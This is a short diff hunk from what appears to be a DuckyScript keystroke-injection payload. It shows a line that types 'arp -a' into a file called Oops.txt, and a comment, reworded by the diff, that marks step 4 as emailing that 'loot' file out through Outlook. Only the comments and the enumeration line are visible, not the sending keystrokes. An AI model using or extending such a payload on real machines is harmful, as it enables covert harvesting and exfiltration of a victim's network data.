@@ -111,7 +111,7 @@ STRING arp -a >> Oops.txt
 DELAY 500
 ENTER
 
-REM - Step 4: Exfiltrate the enumerated file using Outlook
+REM - Step 4: Exfiltrate the generated text file containing the loot using Outlook
 REM -------------------------- 
 
 DELAY 500
